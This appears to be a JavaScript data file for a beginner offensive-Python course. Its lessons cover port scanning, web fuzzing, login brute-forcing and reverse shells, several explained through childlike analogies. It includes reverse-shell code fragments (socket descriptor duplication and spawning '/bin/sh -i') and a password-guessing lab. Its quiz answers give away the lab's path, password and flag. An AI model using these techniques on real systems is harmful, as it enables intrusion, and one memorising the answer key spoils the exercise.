const LESSONS = [
  {
    title: "1. Python Basics & Variables",
    points: 30,
    html: `<div class="htb-diagram-container"><img src="../../../assets/python_basics_diagram.png" alt="Python Basics & Variables" class="htb-diagram"></div>
      <h3>Variables and Basic Syntax</h3>
      <p>Python is an interpreted, high-level, dynamically typed programming language. Variables in Python are dynamically created references to memory locations that store data (such as strings, integers, or booleans). It uses significant indentation for code blocks and provides a robust standard library.</p>
      <p>Imagine you have a magical helper robot named Python! Python is super friendly, but it has a very short memory. To help Python remember things, we use cardboard boxes and write labels on them. In computer talk, these labeled boxes are called 'variables'! If we want the robot to shout out what is inside a box, we tell it to 'print()'.</p>
      <h3>Core Concepts</h3>
      <div class="step-block">
        <div class="step-num">Concept 1</div>
        <div class="step-body"><strong>Variables</strong><br><code>ip_address = "192.168.1.50"</code> grabs a clean box, writes the label on the outside, and puts a string of text inside it. <code>target_port = 80</code> stores a number.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Concept 2</div>
        <div class="step-body"><strong>Data Types</strong><br>Python is smart enough to know what kind of toy is in each box. Text toys are called strings ('str'), and number toys are called integers ('int'). You can cast types using functions like <code>str()</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Concept 3</div>
        <div class="step-body"><strong>Printing</strong><br><code>print(f"[+] Scanning port: {target_port}")</code> uses an f-string, telling the robot to look inside the curly braces {}, find the box, read the number inside it, and shout it out as part of the sentence.</div>
      </div>`,
    questions: [
      { q: "What built-in Python function is used to output text to the screen?", a: "print", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What is the standard file extension for Python scripts? (e.g., .txt)", a: ".py", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "If you call type('123') in Python, what data type class is returned? (type: str/int/bool)", a: "str", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "2. Sockets & Port Scanning",
    points: 40,
    html: `<div class="htb-diagram-container"><img src="../../../assets/python_sockets_diagram.png" alt="Sockets & Port Scanning" class="htb-diagram"></div>
      <h3>Network Sockets</h3>
      <p>A network socket is an internal endpoint for sending or receiving data within a node on a computer network. Python's <code>socket</code> module provides a low-level interface to the underlying operating system's networking API. Using <code>socket.connect_ex()</code> allows developers to programmatically determine if a TCP port is open (returning 0) without raising an exception if it is closed.</p>
      <p>Imagine a computer is like a giant apartment building. The street address of the building is the IP Address. The individual apartment doors inside are called Ports. If we want to find out which apartment doors are open to visitors, we need a special cup-and-string telephone. In Python, this telephone connection is called a socket!</p>
      <h3>Scanning Implementation</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Import and Setup</strong><br><code>import socket</code> opens our toy drawer and pulls out the walkie-talkies. We define <code>target_host</code> and <code>target_port</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Create Connection</strong><br><code>s = socket.socket()</code> stretches out our string telephone line. <code>s.settimeout(2.0)</code> sets a timer so we don't wait forever if nobody answers.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Test the Port</strong><br><code>result = s.connect_ex(...)</code> sends our helper to knock. If the door opens, it returns a 0! If the door is locked, it returns an error code instead of crashing.</div>
      </div>`,
    questions: [
      { q: "What built-in Python module handles network connections?", a: "socket", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What socket method attempts a connection and returns an integer instead of raising an error?", a: "connect_ex", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What integer value indicates a successful connection in connect_ex?", a: "0", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "3. HTTP Requests & Web Fuzzing",
    points: 40,
    html: `<div class="htb-diagram-container"><img src="../../../assets/python_http_diagram.png" alt="HTTP Requests & Web Fuzzing" class="htb-diagram"></div>
      <h3>HTTP Requests</h3>
      <p>The Hypertext Transfer Protocol (HTTP) is the foundation of data communication on the web. In Python, the <code>requests</code> library abstracts the complexities of making HTTP requests. A GET request retrieves a resource, returning a response object containing a status code (e.g., 200 OK, 404 Not Found) and the response body.</p>
      <p>Imagine visiting a website is like going to a restaurant and ordering food. When you want to see a web page, you send a GET request, which is like asking the waiter: "Can I please see the menu?" The waiter looks in the kitchen and returns a status code. Status 200 means "Here you go!", and 404 means "Sorry, we don't have that!"</p>
      <h3>Fuzzing Implementation</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Make Request</strong><br><code>import requests</code> and use <code>response = requests.get(url)</code>. We tell our waiter to run to the kitchen and bring back everything they find, saving it in the response box.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Check Status</strong><br><code>print(response.status_code)</code> checks the code the kitchen gave us. 200 means success, 404 means missing.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Fuzzing Concept</strong><br>Imagine a restaurant has a secret menu. To find it, you automatically guess words rapidly: "Is there a secret admin?" Doing this with a loop and a wordlist is called "fuzzing"!</div>
      </div>`,
    questions: [
      { q: "What external Python library is the standard choice for making HTTP requests?", a: "requests", hint: "Refer to the HTTP protocol details." },
      { q: "What property of the response object contains the HTTP status code?", a: "status_code", hint: "Refer to the HTTP protocol details." },
      { q: "What HTTP response status code indicates a successful resource access?", a: "200", hint: "Refer to the HTTP protocol details." }
    ]
  },
  {
    title: "4. Automated Brute-Forcing",
    points: 50,
    html: `<div class="htb-diagram-container"><img src="../../../assets/python_bruteforce_diagram.png" alt="Automated Brute-Forcing" class="htb-diagram"></div>
      <h3>Automated Form Submission</h3>
      <p>Authentication forms typically accept user credentials via an HTTP POST request, transmitting a payload of key-value pairs (form data or JSON). By utilizing Python loops and a predefined wordlist, an attacker can rapidly construct and transmit thousands of POST requests per second to systematically guess the correct credentials—a process known as brute-forcing.</p>
      <p>Imagine you found a toy treasure chest with a lock that needs a combination. Instead of twisting the dial slowly with your fingers, you build a super-fast mechanical finger that tries thousands of combinations every single second until the chest pops open! That is a brute-forcer.</p>
      <h3>Brute-Force Implementation</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Define Payload</strong><br><code>payload = {"username": "admin", "password": "wrongpassword"}</code>. We write our name and our guess on a note card. This key-value list is called a dictionary.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Send POST Request</strong><br><code>requests.post(url, data=payload)</code>. We hand the note to our waiter, who runs to the gate and slides it into the slot, returning with a reply sheet.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Evaluate Result</strong><br><code>if "Welcome" in response.text:</code> We look at the reply sheet. If it has the word "Welcome" written on it, we did it! We successfully brute-forced the lock.</div>
      </div>`,
    questions: [
      { q: "Which HTTP request method is standard for submitting forms and login parameters?", a: "POST", hint: "Refer to the HTTP protocol details." },
      { q: "What keyword argument is used in requests.post() to send form-encoded data?", a: "data", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What Python collection type (key-value mapping) is used for the payload variable?", a: "dictionary", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "5. Python Reverse Shells",
    points: 40,
    html: `<div class="htb-diagram-container"><img src="../../../assets/python_revshell_diagram.png" alt="Python Reverse Shells" class="htb-diagram"></div>
      <h3>Reverse Shells & Process Execution</h3>
      <p>A reverse shell is a type of shell session established on a connection initiated from a remote machine, not from the attacker's host. It bypasses inbound firewall restrictions. In Python, this is achieved by opening a TCP socket, duplicating the process file descriptors (stdin, stdout, stderr) directly to the socket file descriptor, and then spawning a new interactive shell process using the <code>subprocess</code> or <code>os</code> modules.</p>
      <p>Usually, if you want to control a computer, you try to connect to it from the outside. But what if it has a strong firewall shield? Instead of you connecting to the computer, you get the target computer to connect back to you. This is like your friend throwing a rope out of their window down to your yard. Once the rope is in your hands, you can climb up or send commands straight into their room!</p>
      <h3>Reverse Shell Implementation</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Establish Connection</strong><br><code>s = socket.socket(...)</code> and <code>s.connect(...)</code>. We tie a knot on our rope and throw it out of the window down to the attacker's yard.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Duplicate Descriptors</strong><br><code>os.dup2(s.fileno(), 0)</code>. We tape the computer's ears (stdin, 0) and mouth (stdout, 1) to the rope. Anything the attacker whispers into the rope is heard by the computer.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Spawn Shell</strong><br><code>subprocess.call(["/bin/sh", "-i"])</code>. We open the control console inside the computer. Since ears and mouth are taped to the rope, the attacker can now run anything!</div>
      </div>`,
    questions: [
      { q: "What standard module is used to spawn new processes and run system commands in Python?", a: "subprocess", hint: "Check the command reference blocks." },
      { q: "In a reverse shell, which system initiates the connection: victim or attacker?", a: "victim", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What file descriptor number represents standard input (stdin)?", a: "0", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "6. Practical Scripting Challenge",
    points: 60,
    html: `<div class="htb-diagram-container"><img src="../../../assets/python_challenge_diagram.png" alt="Practical Scripting Challenge" class="htb-diagram"></div>
      <h3>Putting It All Together</h3>
      <p>Practical scripting combines endpoint discovery (fuzzing) with automated exploitation (brute-forcing) into a cohesive workflow. Analysts use these techniques to rapidly audit and exploit targets that would take too long to evaluate manually.</p>
      <p>It is time to put on your detective hat and solve a real mystery! Your Mission: A mock corporate portal castle is running. You must write a Python script in your Kali machine to find the secret path, guess the password, and retrieve the flag.</p>
      <h3>Challenge Steps</h3>
      <div class="step-block">
        <div class="step-num">Step 1</div>
        <div class="step-body"><strong>Discover the Target</strong><br>Inside your Kali machine, look for the secret door. Check what is disallowed by visiting the robots.txt file: <code>curl http://host.docker.internal:PORT/robots.txt</code></div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 2</div>
        <div class="step-body"><strong>Write the Exploit</strong><br>Create a script named <code>exploit.py</code>. Import <code>requests</code>. Define an array of passwords: <code>passwords = ['admin', '123456', 'password', 'pypower', 'letmein']</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Step 3</div>
        <div class="step-body"><strong>Execute the Loop</strong><br>Use a <code>for</code> loop to iterate through the passwords. Submit a <code>requests.post</code> with the current password guess. If the response indicates success, print the password and break the loop. Run it with <code>python3 exploit.py</code>.</div>
      </div>`,
    questions: [
      { q: "What path contains the admin login form? (e.g. /login)", a: "/admin-login", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What is the correct password for the 'admin' account?", a: "pypower", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What flag was revealed inside the admin dashboard? (format: CTF{...})", a: "CTF{py_h4ck_succ3ss_9210}", hint: "Check the command reference blocks." }
    ]
  }
];
